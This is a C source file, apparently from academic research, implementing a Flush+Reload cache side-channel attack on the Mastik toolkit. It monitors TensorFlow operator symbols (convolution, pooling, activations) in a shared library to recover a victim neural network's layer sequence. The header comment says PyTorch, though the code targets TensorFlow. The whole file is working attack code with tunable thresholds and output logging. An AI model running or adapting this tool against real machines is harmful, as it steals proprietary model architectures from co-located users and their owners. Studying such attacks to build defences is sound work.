/*
 * This is the main file for the DL side-channel attack against PyTorch,
 * which is built on top of the Mastik Toolkit (Yarom et. al).
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <symbol.h>
#include <fr.h>
#include <util.h>
#include <math.h>
#include <stdbool.h>

/*
 * These are the hyperparamters of the attack.
 * Adjust for calibration if needed.
 * SAMPLES, SLOT, THRESHOLD, and MINTHRESHOLD should likely
 * stay the same. However, you should run FR-Trace in the
 * Mastik toolkit to find your target machine's correct thresholds.
 * MAX_IDLE is the amount of time in clock cycles the program will
 * wait before quitting after it's last postive sample.
 */
#define SAMPLES       20000000
#define SLOT          5000
#define THRESHOLD     200       // set by runnning Fr-threshold in 'Mastik/demo/'
#define MINTHRESHOLD  0
#define MAX_IDLE      100000

/*
 * Array of function symbols to monitor
 * (Note: these can be the source code --- ex. "mpih−mul.c:85")
 */
char *monitor[] = {
  "TF_NewSession",
  "_ZN10tensorflow6BiasOpIN5Eigen16ThreadPoolDeviceEfE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow9SoftmaxOpIN5Eigen16ThreadPoolDeviceEfE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow18UnaryElementWiseOpIfNS_6ReluOpIN5Eigen16ThreadPoolDeviceEfEEE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow7UnaryOpIN5Eigen16ThreadPoolDeviceENS_7functor4tanhIfEEE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow7UnaryOpIN5Eigen16ThreadPoolDeviceENS_7functor7sigmoidIfEEE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow18UnaryElementWiseOpIfNS_7Relu6OpIN5Eigen16ThreadPoolDeviceEfEEE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow18UnaryElementWiseOpIfNS_10SoftplusOpIN5Eigen16ThreadPoolDeviceEfEEE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow18UnaryElementWiseOpIfNS_10SoftsignOpIN5Eigen16ThreadPoolDeviceEfEEE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow18UnaryElementWiseOpIfNS_6SeluOpIN5Eigen16ThreadPoolDeviceEfEEE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow18UnaryElementWiseOpIfNS_5EluOpIN5Eigen16ThreadPoolDeviceEfEEE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow14LaunchConv2DOpIN5Eigen16ThreadPoolDeviceEfEclEPNS_15OpKernelContextEbbRKNS_6TensorES8_iiiiRKNS_7PaddingEPS6_NS_12TensorFormatE",
  "_ZN10tensorflow8MatMulOpIN5Eigen16ThreadPoolDeviceEfLb0EE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow12MaxPoolingOpIN5Eigen16ThreadPoolDeviceEfE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow8BinaryOpIN5Eigen16ThreadPoolDeviceENS_7functor3addIfEEE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow12AvgPoolingOpIN5Eigen16ThreadPoolDeviceEfE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow12ConcatBaseOpIN5Eigen16ThreadPoolDeviceEfLNS_16AxisArgumentNameE1EE7ComputeEPNS_15OpKernelContextE",
  "_ZN10tensorflow14LaunchConv2DOpIN5Eigen16ThreadPoolDeviceEfEclEPNS_15OpKernelContextEbbRKNS_6TensorES8_iiiiRKNS_7PaddingEPS6_NS_12TensorFormatE+128"
};

/*
 *  Attributes for the monitored functions
 */
char *_monitor_attrs[] = {
  "NewSession",
  "Bias",
  "Softmax",
  "Relu",
  "Tanh",
  "Sigmoid",
  "Relu6",
  "Softplus",
  "Softsign",
  "Selu",
  "Elu",
  "Launch Conv",
  "MatMul",
  "Max Pool",
  "Merge Add",
  "Average Pool",
  "Concat",
  "End Conv"
};


// Size of array to monitor
int _nmonitor = sizeof(monitor)/sizeof(monitor[0]);

// Checks user input
void usage(const char *prog) {
  fprintf(stderr, "Usage: %s <output-location>\n", prog);
  exit(1);
}

// Finds if an int array contains a given int
bool contains(int a, int b[], int size){
  for (int i = 0; i < size; i++) {
    if (a == b[i]) {
      return true;
    }
  }
  return false;
}

/*
 * This function analyzes the raw timing data to get the layer patterns of the victim nn.
 * It then outputs these to a file and calls Analysis.py to write them into a readible format.
 */
void access_info(
  int l, uint16_t *res,
  char outdir[], char csvfile[], char outfile[]
){

  // Set the output locations (by joining)
  char *csvfull = malloc(strlen(outdir) + strlen(csvfile) + 2);
  char *outfull = malloc(strlen(outdir) + strlen(outfile) + 2);
  if (csvfull == NULL || outfull == NULL) {
    fprintf(stderr, "Error: memory allocation error in [access_info]\n");
    exit(1);
  }
  sprintf(csvfull, "%s/%s", outdir, csvfile);
  sprintf(outfull, "%s/%s", outdir, outfile);

  // Initialize the data-holders
  int * listOfThresholdTimes = (int *) malloc(sizeof(int) * l);
  int * listOfTimings = (int *) malloc(sizeof(int) * l);
  int * listOfMonitorHitNum = (int *) malloc(sizeof(int) * l);

  // Store the raw outputs to the csv file
  FILE *csvdata = fopen(csvfull, "w");
  int total = 0;

  for(int i = 0; i < l; i++){
    for(int j = 0; j < _nmonitor; j++) {
      int rrow = i;
      int rcol = j;
      int ridx = i*_nmonitor+j;

      if(res[ridx] < THRESHOLD && res[ridx] > MINTHRESHOLD) {
        listOfThresholdTimes[total] = rrow*_nmonitor;
        listOfTimings[total] = res[ridx];
        listOfMonitorHitNum[total] = rcol;
        total++;
        fprintf(csvdata, "%i,%i,%i,hit,%s\n", \
                rrow, rcol, res[ridx], _monitor_attrs[rcol]);
      }
      else {
        continue;
        // fprintf(csvdata, "%i,%i,%i,miss\n", \
        //         rrow, rcol, res[ridx]);
      }
    }
  }
  fclose(csvdata);

  return;
}

/*
 * Main: identify the function invocations,
 *       the functions are specified at the top of the file.
 */
int main(int ac, char **av) {
  /*
   * Initializations:
   * - Location of the library (.so) file
   * - Location to store the output
   */
  char *libfile = "/home/sweety/venv2/lib/"
                  "python2.7/site-packages/tensorflow/"
                  "python/_pywrap_tensorflow_internal.so";
  char *outdir = av[1];
  if (outdir == NULL) {
    printf("Error: specify the location of the output folder\n");
    exit(1);
  }

  // Prepare the Flush+Reload
  fr_t fr = fr_prepare();

  // Monitor the functions specified above
  fprintf(stderr, "------------ Monitor -------------\n");
  for (int i = 0; i < _nmonitor; i++) {
    fprintf(stderr, " Searching [%2d] for [%.20s]: ", i, monitor[i]);
    uint64_t offset = sym_getsymboloffset(libfile, monitor[i]);
    if (offset == ~0ULL) {
      fprintf(stderr, "Error: cannot find the func. in [%s]\n", libfile);
      exit(1);
    }
    fr_monitor(fr, map_offset(libfile, offset));
    printf(": the func. offset [%10lx]\n", offset);
  }
  fprintf(stderr, "------------- Total --------------\n");
  fprintf(stderr, " Monitored: [%2i]\n", _nmonitor);
  fprintf(stderr, "----------------------------------\n");

  // Initialize probes
  uint16_t *res = (uint16_t *) malloc(SAMPLES * _nmonitor * sizeof(uint16_t));
  for (int i = 0; i < SAMPLES * _nmonitor ; i+= 4096/sizeof(uint16_t))
    res[i] = 1;
  fr_probe(fr, res);

  // Trace the function calls
  int l = fr_trace(fr, SAMPLES, res, SLOT, THRESHOLD, MAX_IDLE);

  // Output to the file location
  fprintf(stderr, "Do analysis of collected data\n");
  access_info(l, res, outdir, "accesses.raw.csv", "accesses.txt");

  // Release the buffers
  free(res);
  fr_release(fr);

  return 0;
}
